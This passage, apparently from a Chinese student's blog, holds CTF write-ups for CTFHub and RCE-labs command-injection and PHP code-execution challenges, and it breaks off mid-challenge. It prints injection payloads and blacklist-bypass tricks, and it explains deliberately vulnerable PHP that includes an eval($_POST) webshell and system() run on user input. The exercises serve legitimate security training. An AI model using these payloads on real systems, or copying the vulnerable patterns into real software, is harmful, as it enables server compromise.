class="number">22</span>docker%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>pkshow%<span class="number">22</span>%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>D%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>neutron%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nova%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737544347967-bfea4fb9-5bc1-427e-b675-02f08a0abf78.png"></p>]]></content>
      
      
      <categories>
          
          <category> 2025Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 Win RCE</title>
      <link href="/2025/01/18/2025Win/2025%20Win%20RCE/"/>
      <url>/2025/01/18/2025Win/2025%20Win%20RCE/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、Ctfhub-RCE模块—-命令注入"><a href="#一、Ctfhub-RCE模块—-命令注入" class="headerlink" title="一、Ctfhub-RCE模块—-命令注入"></a><font style="color:#000000;">一、</font><font style="color:#000000;">Ctfhub-RCE模块—-命令注入</font></h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869042716-628c0662-eaa9-4b52-8bd7-8417c08ede64.png"></p><p><font style="color:#000000;">打开环境后发现这个页面,按照上课讲的,肯定是先访问自己</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869098526-6d23292f-0405-419f-b82a-e3755dd5fcca.png"></p><p><font style="color:#000000;">接着出现了数组</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869347310-3b4327cf-06f7-443d-976f-90f3addbfdc9.png"></p><p><font style="color:#000000;">之后</font><font style="color:#000000;">列出目录内容,看一下文件有哪些</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869085155-53941a9c-04d7-47a1-863f-a4fd3ef058f9.png"></p><p><font style="color:#000000;">查看这个2760816330439.php文件</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls;cat 2760816330439.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869042753-4fa0310d-29ae-484e-9482-30a2696a875f.png"></p><p><font style="color:#000000;">再查看页面源代码就可以了得到flag了：ctfhub{4ce5f47f3595fceda2ebb063}</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869042691-bdb910eb-814f-4834-ae39-e1d39d3422eb.png"></p><p><font style="color:#000000;">又忍耐不住自己的好奇心,查看了index文件,感觉这个好像是这个页面的文件。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736869234542-d14ace8b-abe1-4236-b7b7-905088fd87c0.png"></p><h1 id="二、RCE-labs-0-8-题"><a href="#二、RCE-labs-0-8-题" class="headerlink" title="二、RCE-labs[0-8]题"></a><font style="color:#000000;">二、RCE-labs[0-8]题</font></h1><h2 id="（一）-RCE-labs-Level-0-代码执行-命令执行"><a href="#（一）-RCE-labs-Level-0-代码执行-命令执行" class="headerlink" title="（一）[RCE-labs]Level 0 -  代码执行&amp;命令执行"></a><font style="color:#000000;">（一）</font><font style="color:#000000;">[RCE-labs]Level 0 -  代码执行&amp;命令执行</font></h2><p><font style="color:#000000;">打开靶场后发现以下内容：</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736899733389-cf8ffae0-a3e0-4f7e-ae16-97fb24972faa.png"></p><p><font style="color:#000000;">这个应该是一个学习的靶场,毕竟flag直接给出了</font></p><p><font style="color:#000000;">分析一下代码：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br></pre></td></tr></table></figure><p><font style="color:#000000;">php代码开始标志</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> (<span class="string">&quot;get_flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">include文件包含,把get_flag.php文件包含进来</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="string">&quot;include(&#x27;flag.php&#x27;);echo &#x27;This will get the flag by eval PHP code: &#x27;.\$flag;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$bash</span> = <span class="string">&quot;echo &#x27;This will get the flag by Linux bash command - cat /flag: &#x27;;cat /flag&quot;</span>;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">声明两个变量并把两个字符串分别写进code变量和bash变量中</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">把code变量里的内容作为代码执行,即执行以下代码,把flag.php包含进来并且输出,其中 .&#x2F;  代表在当前目录中访问flag.php文件</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;This will get the flag by eval PHP code: &#x27;</span>.\<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">换行,<br>是换行符</font></p><p><font style="color:#000000;"></font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">system($</span><span class="language-bash">bash)</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">system是执行外部程序并且显示输出,所以执行以下命令,输出flag</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;This will get the flag by Linux bash command - cat /flag: &#x27;</span>;cat /flag</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">其中cat 是Linux命令含义是查看文件内容,cat &#x2F;flag 即查看flag</font></p><h2 id="（二）-RCE-labs-Level-1-一句话木马和代码执行"><a href="#（二）-RCE-labs-Level-1-一句话木马和代码执行" class="headerlink" title="（二） [RCE-labs]Level 1 - 一句话木马和代码执行"></a><font style="color:#000000;">（二） </font><font style="color:#000000;">[RCE-labs]Level 1 - 一句话木马和代码执行</font></h2><p><font style="color:#000000;">打开靶场发现以下内容,这主要还是来学习的</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736919959812-c51d3e5c-a7ab-4fac-9cf7-f3644814b211.png"></p><p><font style="color:#000000;">分析代码：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br></pre></td></tr></table></figure><p><font style="color:#000000;">php代码开头</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> (<span class="string">&quot;get_flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">把get_flag,php包含进来</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">把POST传参的字符串当作代码执行</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">对指定的PHP 文件进行语法高亮显示</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">PHP代码结束标志</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">所以用POST传参就可以得到flag</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736944964641-1505e62c-bd72-4d84-8ece-3deec5d804db.png"></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">在课程中学长也介绍了第二种解体方法,就是用中国蚁剑</font></p><p><font style="color:#000000;">打开中国蚁剑,看看文件</font><font style="color:#000000;"></font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920820579-2ec5aaab-05c2-4d55-a4a1-51eed600ec10.png"></p><p><font style="color:#000000;">就直接在根目录找到了flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920820575-8b9522dc-66b4-45d8-9abb-70274b972836.png"></p><p><font style="color:#000000;">打开后得到flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920820473-aeba862f-1806-4394-b268-0ddc4c8a15fb.png"></p><p><font style="color:#000000;">但是又发现了这个文件,hhh不建议直接在根目录拿flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736920971951-b0d56482-54b0-46e1-959d-36d0ccd49986.png"></p><h2 id="（三）-RCE-labs-Level-2-PHP代码执行函数"><a href="#（三）-RCE-labs-Level-2-PHP代码执行函数" class="headerlink" title="（三）[RCE-labs]Level 2 - PHP代码执行函数"></a><font style="color:#000000;">（三）</font><font style="color:#000000;">[RCE-labs]Level 2 - PHP代码执行函数</font></h2><p><font style="color:#000000;">打开靶场发现以下内容,是很长的PHP代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736945242221-1aee7e38-7229-493d-8803-78d728099e19.png"></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">简单分析代码：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;get_flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">把get_flag.php包含进来,并声明了flag为超级全局变量,说明变量flag在一个脚本的全部作用域中都可用并开启session</font></p><p><font style="color:#000000;">session_start();是PHP中的一个函数,用于启动一个会话。当一个用户访问网站时,会话（Session）是用来存储用户特定数据的一种机制,这些数据可以被多个页面共享。通过启动会话,PHP能够识别用户,并在用户的多次请求之间保存数据。</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_ctf</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$function</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$content</span> . <span class="string">&quot;);&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your Code: <span class="subst">$code</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">定义了一个函数叫hello_ctf,其中两个变量是function, content。之后把变量function和”(“ . $content . “);”链接起来赋值给code,之后输出Your Code: $code 并换行,最后将code里的字符串作为代码输出</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$func_list</span> = [<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;usort&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;array_reduce&#x27;</span>,<span class="string">&#x27;preg_replace&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>] = <span class="variable">$func_list</span>[<span class="title function_ invoke__">array_rand</span>(<span class="variable">$func_list</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$random_func</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$url_fucn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/_/&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;获得新的函数: <span class="subst">$random_func</span> ,去 https://www.php.net/manual/zh/function.&quot;</span>.<span class="variable">$url_fucn</span>.<span class="string">&quot;.php 查看函数详情。&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;random_func&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">这段代码定义了一个函数get_fun,func_list是一个包含多个PHP内置函数的数组。</font></p><p><font style="color:#000000;">之后如果代码$_SESSION不存在,则通过array_rand随机选择func_list里的函数。</font></p><p><font style="color:#000000;">再然后把$_SESSION赋值给random_func。然后把所选函数名的下划线变为短横线。</font></p><p><font style="color:#000000;">之后输出一个消息,告诉所选的函数名并提供一个PHP官方的手册链接。</font></p><p><font style="color:#000000;">最后返回在 $_SESSION里的函数名</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"><span class="variable">$act</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$random_func</span> = <span class="title function_ invoke__">get_fun</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&quot;r&quot;</span>)&#123; <span class="comment">/* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */</span></span><br><span class="line">        <span class="title function_ invoke__">session_unset</span>();</span><br><span class="line">        <span class="title function_ invoke__">session_destroy</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$act</span> == <span class="string">&quot;submit&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$user_content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]; </span><br><span class="line">        <span class="title function_ invoke__">hello_ctf</span>(<span class="variable">$random_func</span>, <span class="variable">$user_content</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">这个函数定义了start函数</font><font style="color:#000000;">。</font></p><p><font style="color:#000000;">把get_fun()的返回值赋值给$random_fun。</font></p><p><font style="color:#000000;">如果形参act的值是r,则执行 session_unset();session_destroy(); 两个函数。</font></p><p>_<font style="color:#000000;"> session_unset()为释放当前在内存中已经创建的所有$<em>SESSION变量,但不删除session文件以及不释放对应的sessionidsession_destroy()</font></em></p><p>_<font style="color:#000000;">session_destroy()为删除当前用户对应的session文件以及释放sessionid,内存中的$<em>SESSION变量内容依然保留</font></em></p><p><font style="color:#000000;">如果act的值是submit则把content POST传参的值赋值给 $user_content,之后执行hello_ctf函数</font></p><p><font style="color:#000000;"></font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) ? <span class="title function_ invoke__">start</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">检查action是否为随机值,如果是则没有回显,如果有则执行start函数</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">所以这道题需要先把action,GET传参,值是submit,来调用hello_ctf函数来输出$flag。想要输出flag的话,就需要利用content POST传参来传入输出flag的函数即eval函数或者其他相关函数。</font></p><p><font style="color:#000000;">所以GET,POST传参如下</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=submit</span><br><span class="line">content=eval(&#x27;echo $flag;&#x27;)</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">得到flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736950434048-5669a1ab-fe09-4d18-9715-134492e9fd91.png"></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">注意到题上还说”PHP还有许多回调函数也可以直接或者间接的执行PHP代码。“</font></p><p><font style="color:#000000;">查了资料,assert就可以,但它无法执行关于echo的代码,起初以为是echo是语言构造器的原因,但是用了同为语言构造器的print,发现却能用</font></p><p><font style="color:#000000;">所以,最后GET,POST也可传参如下</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?action=submit</span><br><span class="line">content=assert(print_r($flag))</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">得到flag</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736948907826-b147caf5-7165-4653-961f-3b8c5668f7aa.png"></p><h2 id="（四）-RCE-labs-Level-3-命令执行"><a href="#（四）-RCE-labs-Level-3-命令执行" class="headerlink" title="（四）[RCE-labs]Level 3 - 命令执行"></a><font style="color:#000000;">（四）</font><font style="color:#000000;">[RCE-labs]Level 3 - 命令执行</font></h2><p><font style="color:#000000;">打开靶场发现以下内容</font></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1736951372909-00eaf283-fe07-4834-b561-1778d9513639.png"></h2><p><font style="color:#000000;">由于system()函数会通过sh软件连接执行输入的系统命令,所以只需要POST传入访问flag命令就行</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=cat /flag;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737124450767-e315173a-34dc-4813-b9c2-9fe5f03e1acf.png"></p><h2 id="（五）-RCE-labs-Level-4-SHELL-运算符"><a href="#（五）-RCE-labs-Level-4-SHELL-运算符" class="headerlink" title="（五）[RCE-labs]Level 4 - SHELL 运算符"></a><font style="color:#000000;">（五）[RCE-labs]Level 4 - SHELL 运算符</font></h2><p><font style="color:#000000;">进入靶机发现以下题目</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737124467767-57170292-4b96-4989-8acc-d82db997fe77.png"></p><p><font style="color:#000000;">PHP代码如下：</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">hello_server</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="string">&quot;ping -c 1 <span class="subst">$ip</span>&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) ? <span class="title function_ invoke__">hello_server</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">分析代码：</font></p><p><font style="color:#000000;">首先定义了一个函数 hello_server,其中形参是$ip,执行system函数,函数的内容是ping -c 1 ,指的是向目标 IP 发送 一个ICMP 请求,并等待其响应 。函数结束</font></p><p><font style="color:#000000;">之后判断GET传参的ip是否为随机值,如果不是随机值的话执行函数hello_server,如果是随机值的话,则不再执行其他操作。</font></p><p><font style="color:#000000;">所以需要传入127.0.0.1来指向自己并且在后面加入输出flag的命令,即</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat /flag;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737125338492-6594f63e-9609-4a4c-91c6-b7a64009284b.png"></p><h2 id="（六）-RCE-labs-Level-5-黑名单式过滤"><a href="#（六）-RCE-labs-Level-5-黑名单式过滤" class="headerlink" title="（六）[RCE-labs]Level 5 - 黑名单式过滤"></a><font style="color:#000000;">（六）</font><font style="color:#000000;">[RCE-labs]Level 5 - 黑名单式过滤</font></h2><p><font style="color:#000000;">打开靶场发现以下内容</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737126533765-55c4411a-3c39-49de-a502-f98fa4afef3e.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">preg_match()函数是匹配函数,</font><font style="color:#000000;">如果找到一个匹配</font><font style="color:#000000;">,则返回值为1,否则为0</font></p><p><font style="color:#000000;">这段PHP代码先是定义了一个hello_shell函数,形参是cmd。</font></p><p><font style="color:#000000;">之后判断cmd变量与flag是否匹配,如果,则输出WAF!,否则执行system函数。函数结束</font></p><p><font style="color:#000000;">然后判断GET传参的cmd是否为随机值,如果是,则执行hello_shell函数,否则什么也不执行</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">所以要把cat &#x2F;flag修饰以下,而又</font><font style="color:#000000;">用*绕过,即fl*、用’绕过,即f’’lag或f’l’ag绕过,这都可以,</font><font style="color:#000000;">因此构造playload,得到flag</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat /fl<span class="string">&#x27;&#x27;</span>ag</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737127527733-5f4cff11-bcc7-4f21-bf58-8195ab732d7b.png"></p><h2 id="（七）-RCE-labs-Level-6-通配符匹配绕过"><a href="#（七）-RCE-labs-Level-6-通配符匹配绕过" class="headerlink" title="（七）[RCE-labs]Level 6 - 通配符匹配绕过"></a><font style="color:#000000;">（七）</font><font style="color:#000000;">[RCE-labs]Level 6 - 通配符匹配绕过</font></h2><p><font style="color:#000000;">打开靶场发现以下内容,是PHP代码</font></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737127875645-cc2125db-6b75-43db-8bbb-fb6287e0bce1.png"></p><p><font style="color:#000000;">这是上一题的加强版,代码如下</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;WAF!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) ? <span class="title function_ invoke__">hello_shell</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">这题与上一题的不同在于多了几个符号[b-zA-Z_@#%^&amp;*:{}-+&lt;&gt;&quot;|&#96;;[]]</font></p><p><font style="color:#000000;"> 匹配范围为：</font></p><p><font 